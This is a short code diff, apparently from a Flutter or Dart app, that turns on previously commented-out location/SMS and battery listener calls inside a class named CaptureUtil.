@@ -39,10 +39,10 @@ class CaptureUtil {
     _stream();
 
     // ⬇️ LOCATION + SMS
-    //_locationListen();
+    _locationListen();
 
     // ⬇️ BATTERY
-    //_batteryListen();
+    _batteryListen();
   }
 
   void stop() async {
